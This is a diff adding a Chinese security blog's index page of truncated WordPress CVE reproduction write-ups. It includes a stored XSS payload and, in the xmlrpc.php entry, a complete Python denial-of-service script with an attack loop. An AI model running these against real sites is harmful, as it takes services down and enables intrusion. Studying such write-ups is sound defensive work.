+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-6977%EF%BC%89WordPress%205.0%20rce/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.703Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-6977）WordPress-5-0-RCE"><a href="#（CVE-2019-6977）WordPress-5-0-RCE" class="headerlink" title="（CVE-2019-6977）WordPress 5.0 RCE"></a>（CVE-2019-6977）WordPress 5.0 RCE</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞条件：拥有一个author权限的账号</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>影响包括windows、linux、mac在内的服务端，后端图片处理库为gd/imagick都受到影响，只不过利用难度有所差异。</p>
+<p>其中，原文提到只影响release<br>5.0.0版，但现在官网上可以下载的5.0.0已经修复该漏洞。实际在WordPress<br>5.1-alpha-44280更新后未更新的4.9.9~5.0.0的WordPress都受到该漏洞影响。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>传图片</p>
+<p><img src="/resource/(CVE-2019-6977)WordPress5.0rce/media/rId24.png"></p>
+<p>改信息</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-6977%EF%BC%89WordPress%205.0%20rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-6977%EF%BC%89WordPress%205.0%20rce/" data-id="cl5c2qygv00mby8v1d5faebjv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2019-17671）Wordpress _= 5.2.3未授权访问" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-17671%EF%BC%89Wordpress%20_=%205.2.3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.700Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-17671）Wordpress未授权访问"><a href="#（CVE-2019-17671）Wordpress未授权访问" class="headerlink" title="（CVE-2019-17671）Wordpress未授权访问"></a>（CVE-2019-17671）Wordpress未授权访问</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>wordpress 爆出最新的查看未经身份验证的文章漏洞，<br>该漏洞源于程序没有正确处理静态查询，<br>攻击者可利用该漏洞未经认证查看部分内容</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WordPress &lt;= 5.2.3</p>
+<h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p><img src="/resource/(CVE-2019-17671)Wordpress%3C=5.2.3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId24.png"></p>
+<h2 id="登陆后台新建私密页面"><a href="#登陆后台新建私密页面" class="headerlink" title="登陆后台新建私密页面"></a>登陆后台新建私密页面</h2><p><img src="/resource/(CVE-2019-17671)Wordpress%3C=5.2.3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId26.png"></p>
+<h3 id="随便填入内容，选择私密，发布"><a href="#随便填入内容，选择私密，发布" class="headerlink" title="随便填入内容，选择私密，发布"></a>随便填入内容，选择私密，发布</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-17671%EF%BC%89Wordpress%20_=%205.2.3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-17671%EF%BC%89Wordpress%20_=%205.2.3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cl5c2qygu00may8v13h6ccetc" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2019-16773）WordPress 5.3.0 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16773%EF%BC%89WordPress%205.3.0%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.698Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-16773）WordPress-5-3-0-储存型xss"><a href="#（CVE-2019-16773）WordPress-5-3-0-储存型xss" class="headerlink" title="（CVE-2019-16773）WordPress 5.3.0 储存型xss"></a>（CVE-2019-16773）WordPress 5.3.0 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。<br>WordPress<br>3.7版本至5.3.0版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WordPress 3.7版本至5.3.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><ol>
+<li><p>如果论坛用户的个人资料显示在其个人资料页面中，则此方法有效。以管理员身份登录并转到外观-&gt;自定义，然后进入BuddyPress<br> Nouveu-&gt;成员首页，并确保启用了显示用户个人资料的功能</p>
+</li>
+<li><p> 创建普通论坛用户帐户</p>
+</li>
+<li><p> 登录并编辑您的个人资料。将用户描述修改为一下代码</p>
+</li>
+</ol>
+<ul>
+<li>  <a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a></li>
+</ul>
+<ol start="4">
+<li> 访问您的配置文件并将鼠标悬停在链接上。</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16773%EF%BC%89WordPress%205.3.0%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16773%EF%BC%89WordPress%205.3.0%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qygr00m7y8v1f6webjoc" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16219%EF%BC%89WordPress%205.2.3%20%E5%86%85%E7%BD%AE%E7%BC%96%E8%BE%91%E5%99%A8Gutenberg%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.696Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-16219）内置编辑器Gutenberg-储存型xss"><a href="#（CVE-2019-16219）内置编辑器Gutenberg-储存型xss" class="headerlink" title="（CVE-2019-16219）内置编辑器Gutenberg 储存型xss"></a>（CVE-2019-16219）内置编辑器Gutenberg 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Gutenberg编辑器无法过滤”简码”错误消息中的JavaScript /<br>HTML代码，导致可执行任意JavaScript / HTML代码</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>wordpress 5.0到5.0.4、5.1和5.1.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在WordPress<br>5.0中，用户可以在帖子中添加Shortcode块。当在Shortcode块中添加某些HTML编码字符（例如”＆lt;”），然后重新打开该帖子时，它将显示错误消息，并通过将”＆lt;”解码为”<br>&lt;“来预览它。</p>
+<p>图1.将HTML编码的字符插入Shortcode块</p>
+<p><img src="/resource/(CVE-2019-16219)WordPress5.2.3%E5%86%85%E7%BD%AE%E7%BC%96%E8%BE%91%E5%99%A8Gutenberg%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId24.png"></p>
+<p>图2.带有预览的Shortcode错误消息</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16219%EF%BC%89WordPress%205.2.3%20%E5%86%85%E7%BD%AE%E7%BC%96%E8%BE%91%E5%99%A8Gutenberg%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16219%EF%BC%89WordPress%205.2.3%20%E5%86%85%E7%BD%AE%E7%BC%96%E8%BE%91%E5%99%A8Gutenberg%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qygt00m9y8v1h9hy307y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2018-6389）WordPress _= 4.9.x 拒绝服务漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2018-6389%EF%BC%89WordPress%20_=%204.9.x%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.694Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-6389）WordPress-lt-4-9-x-拒绝服务漏洞"><a href="#（CVE-2018-6389）WordPress-lt-4-9-x-拒绝服务漏洞" class="headerlink" title="（CVE-2018-6389）WordPress &lt;= 4.9.x 拒绝服务漏洞"></a>（CVE-2018-6389）WordPress &lt;= 4.9.x 拒绝服务漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WordPress &lt;= 4.9.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在文件 WordPress/wp-admin/load-scripts.php 中：</p>
+<pre><code>&lt;?php
+...//ignore
+$load = $_GET[&#39;load&#39;];
+if ( is_array( $load ) ) &#123;
+    $load = implode( &#39;&#39;, $load );
+&#125;
+$load = preg_replace( &#39;/[^a-z0-9,_-]+/i&#39;, &#39;&#39;, $load );
+$load = array_unique( explode( &#39;,&#39;, $load ) );
+...//ignore
+foreach ( $load as $handle ) &#123;
+    if ( ! array_key_exists( $handle, $wp_scripts-&gt;registered ) ) &#123;
+        continue;
+    &#125;
+    $path = ABSPATH . $wp_scripts-&gt;registered[ $handle ]-&gt;src;
+    $out .= get_file( $path ) . &quot;\n&quot;;
+&#125;
+...//ignore
+echo $out;
+exit;
+</code></pre>
+<p>load-scripts.php<br>文件会根据load参数传入的文件名依次载入文件并输出。同时程序对load参数的内容进行了过滤，只有在白名单$wp_scripts中的JS文件才会被载入。</p>
+<p>该JS文件白名单的内容在文件 WordPress/wp-includes/script-loader.php 中：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2018-6389%EF%BC%89WordPress%20_=%204.9.x%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2018-6389%EF%BC%89WordPress%20_=%204.9.x%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygt00m8y8v1bk720t4g" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2017-8295）WordPress _=4.8.3 任意密码重置_HOST头注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-8295%EF%BC%89WordPress%20_=4.8.3%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE_HOST%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.692Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-8295）WordPress-2-3-4-8-3-任意密码重置-HOST头注入漏洞"><a href="#（CVE-2017-8295）WordPress-2-3-4-8-3-任意密码重置-HOST头注入漏洞" class="headerlink" title="（CVE-2017-8295）WordPress 2.3-4.8.3 任意密码重置/HOST头注入漏洞"></a>（CVE-2017-8295）WordPress 2.3-4.8.3 任意密码重置/HOST头注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在 WordPress 2.3-4.8.3<br>版本中找回密码功能未正确设置发送邮件的信息，在发送找回密码邮件的过程中直接使用<br>Host<br>地址作为邮件请求头的一部分，在一些情况下攻击者可利用该功能窃取找回密码邮件内容。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WordPress 2.3-4.8.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 WordPress 中， wp_mail()<br>函数用来发送邮件，在发送邮件的过程中如果没有设置 发件地址（From）<br>，则会自动使用 &#39;wordpress@&#39; + $_SERVER[&#39;SERVER_NAME&#39;]<br>作为邮件的 发件地址。主流的 Web 服务器中的 SERVER_NAME<br>变量来自于客户端请求中 HTTP_HOST 头，这就意味着该发件地址是用户可控的。</p>
+<p>wp_mail() 函数的声明在文件 WordPress/wp-includes/pluggable.php 中：</p>
+<pre><code>function wp_mail( $to, $subject, $message, $headers = &#39;&#39;, $attachments = array() ) &#123;
+...//ignore
+    if ( !isset( $from_email ) ) &#123;
+        // Get the site domain and get rid of www.
+        $sitename = strtolower( $_SERVER[&#39;SERVER_NAME&#39;] );
+        if ( substr( $sitename, 0, 4 ) == &#39;www.&#39; ) &#123;
+            $sitename = substr( $sitename, 4 );
+        &#125;
+        $from_email = &#39;wordpress@&#39; . $sitename;
+    &#125;
+    /**
+     * Filters the email address to send from.
+     *
+     * @since 2.2.0
+     *
+     * @param string $from_email Email address to send from.
+     */
+    $from_email = apply_filters( &#39;wp_mail_from&#39;, $from_email );
+    /**
+     * Filters the name to associate with the &quot;from&quot; email address.
+     *
+     * @since 2.3.0
+     *
+     * @param string $from_name Name associated with the &quot;from&quot; email address.
+     */
+    $from_name = apply_filters( &#39;wp_mail_from_name&#39;, $from_name );
+    $phpmailer-&gt;setFrom( $from_email, $from_name );
+...//ignore
+&#125;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-8295%EF%BC%89WordPress%20_=4.8.3%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE_HOST%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-8295%EF%BC%89WordPress%20_=4.8.3%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE_HOST%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygq00m5y8v12rangvxn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-6514%EF%BC%89WordPress%204.7.2%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.689Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-6514）敏感信息泄漏"><a href="#（CVE-2017-6514）敏感信息泄漏" class="headerlink" title="（CVE-2017-6514）敏感信息泄漏"></a>（CVE-2017-6514）敏感信息泄漏</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>CVE-2017-6514通过CFSECURITE查找获得WORDPRESS登录可能的源代码披露</p>
+<pre><code>http://www.0-sec.org/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.0-sec.org% 2F＆format = xm
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-6514%EF%BC%89WordPress%204.7.2%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-6514%EF%BC%89WordPress%204.7.2%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" data-id="cl5c2qygq00m6y8v1f7ryfbqn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/WordPress _=5.3.0 xmlrpc.php 拒绝服务漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/WordPress%20_=5.3.0%20xmlrpc.php%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.687Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WordPress-lt-5-3-x-xmlrpc-php拒绝服务漏洞"><a href="#WordPress-lt-5-3-x-xmlrpc-php拒绝服务漏洞" class="headerlink" title="WordPress &lt;=5.3.x xmlrpc.php拒绝服务漏洞"></a>WordPress &lt;=5.3.x xmlrpc.php拒绝服务漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WordPress &lt;= 5.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞文件</p>
+<pre><code>/wordpress/xmlrpc.php
+/wp/xmlrpc.php
+from urllib.parse import urlparse
+import sys, uuid, urllib3, requests
+urllib3.disable_warnings()
+
+DEBUG = True 
+def dprint(X):
+    if DEBUG: print(X)
+
+COUNT=0
+def build_entry(pingback,target):
+    global COUNT
+    COUNT +=1
+    entry  = &quot;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;pingback.ping&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&quot;
+    entry += f&quot;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&#123;pingback&#125;/&#123;COUNT&#125;&lt;/value&gt;&quot;
+    #entry += f&quot;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&#123;pingback&#125;/&#123;uuid.uuid4()&#125;&lt;/value&gt;&quot;
+    entry += f&quot;&lt;value&gt;&#123;target&#125;/?p=1&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&quot;
+    #entry += f&quot;&lt;value&gt;&#123;target&#125;/#e&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&quot; # taxes DB more
+    return entry
+
+def build_request(pingback,target,entries):
+    prefix   = &quot;&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;array&gt;&quot;
+    suffix   = &quot;&lt;/array&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;
+    request  = prefix
+    for _ in range(0,entries): request += build_entry(pingback,target)
+    request += suffix
+    return request
+
+def usage_die():
+    print(f&quot;[!] Usage: &#123;sys.argv[0]&#125; &lt;check/attack&gt; &lt;pingback url&gt; &lt;target url&gt;&quot;)
+    exit(1)
+
+def get_args():
+    if len(sys.argv) != 4: usage_die()
+    action   = sys.argv[1]
+    pingback = sys.argv[2]
+    target   = sys.argv[3]
+    if action not in (&quot;check&quot;,&quot;attack&quot;): usage_die()
+    for URL in (pingback,target):
+        res = urlparse(URL)
+        if not all((res.scheme,res.netloc)): usage_die()
+    return (action,pingback,target)
+
+def main(action,pingback,target):
+    print(&quot;[&gt;] WordPress &lt;= 5.3.? Denial-of-Service PoC&quot;)
+    print(&quot;[&gt;] @roddux 2019 | Arcturus Security | labs.arcturus.net&quot;)
+    # he checc
+    if action == &quot;check&quot;:    entries = 2
+    # he attacc
+    elif action == &quot;attack&quot;: entries = 2000
+    # but most importantly
+    print(f&quot;[+] Running in &#123;action&#125; mode&quot;)
+    # he pingbacc
+    print(f&quot;[+] Got pingback URL \&quot;&#123;pingback&#125;\&quot;&quot;)
+    print(f&quot;[+] Got target URL \&quot;&#123;target&#125;\&quot;&quot;)
+    print(f&quot;[+] Building &#123;entries&#125; pingback calls&quot;)
+    # entries = 1000 # TESTING
+    xmldata = build_request(pingback,target,entries)
+    dprint(&quot;[+] Request:\n&quot;)
+    dprint(xmldata+&quot;\n&quot;)
+    print(f&quot;[+] Request size: &#123;len(xmldata)&#125; bytes&quot;)
+    if action == &quot;attack&quot;:
+        print(&quot;[+] Starting attack loop, CTRL+C to stop...&quot;)
+        rcount = 0
+        try:
+            while True:
+                    try:
+                        resp  = requests.post(f&quot;&#123;target&#125;/xmlrpc.php&quot;, xmldata, verify=False, allow_redirects=False, timeout=.2)
+                        #dprint(resp.content.decode(&quot;UTF-8&quot;)[0:500]+&quot;\n&quot;)
+                        if resp.status_code != 200:
+                            print(f&quot;[!] Received odd status (&#123;resp.status_code&#125;) -- DoS successful?&quot;)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+                        pass
+                    rcount += 1
+                    print(f&quot;\r[+] Requests sent: &#123;rcount&#125;&quot;,end=&quot;&quot;)
+        except KeyboardInterrupt:
+            print(&quot;\n[&gt;] Attack finished&quot;,end=&quot;\n\n&quot;)
+            exit(0)
+    elif action == &quot;check&quot;:
+        print(&quot;[+] Sending check request&quot;)
+        try:
+            resp = requests.post(f&quot;&#123;target&#125;/xmlrpc.php&quot;, xmldata, verify=False, allow_redirects=False, timeout=10)
+            if resp.status_code != 200:
+                print(f&quot;[!] Received odd status (&#123;resp.status_code&#125;) -- check target url&quot;)
+            print(&quot;[+] Request sent&quot;)
+            print(&quot;[+] Response headers:\n&quot;)
+            print(resp.headers)
+            print(&quot;[+] Response dump:&quot;)
+            print(resp.content.decode(&quot;UTF-8&quot;))
+            print(&quot;[+] Here&#39;s the part where you figure out if it&#39;s vulnerable, because I CBA to code it&quot;)
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+            print(&quot;[!] Connection error&quot;)
+            exit(1)
+        print(&quot;[&gt;] Check finished&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main(*get_args()
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/WordPress%20_=5.3.0%20xmlrpc.php%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/WordPress%20_=5.3.0%20xmlrpc.php%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygo00m4y8v1fughhrts" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/Wordpress _= 4.9.6 任意文件删除漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
